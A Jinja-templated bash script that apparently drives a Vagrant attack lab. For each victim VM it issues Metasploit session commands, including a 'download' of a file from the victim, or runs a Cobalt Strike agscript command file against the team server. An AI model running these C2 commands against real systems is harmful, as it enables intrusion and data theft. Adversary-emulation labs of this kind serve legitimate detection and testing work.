#!/bin/bash

{% for vm, vmd in victim.items() %}
{%- if vmd.platform == 'linux' %}
{% set c2script = "msf-c2cmd-" + vm %}
cat << EOF > {{ c2script }}
lpwd
lls
pwd
ls
download /vagrant/{{ dependencies['cs_installer'] }}
lls
EOF

vagrant ssh attacker -c 'tmux send -t {{ vm }}:0 "run /vagrant/{{ c2script }}" ENTER'

{%- elif vmd.platform == 'windows' %}
vagrant ssh attacker -c 'tmux new-window -t cobaltstrike -n c2cmd-{{ vm }} "cd {{ attacker.cobaltstrike.folder_name }} && ./agscript {{ attacker.ip }} {{ attacker.cobaltstrike.team_server.port }} c2cmd-{{ vm }} {{ attacker.cobaltstrike.team_server.password }} /vagrant/c2commands.cna"' 

{%- else %}
Invalid platform: {{ vmd.platform }}
{%- endif %}

{% endfor %}
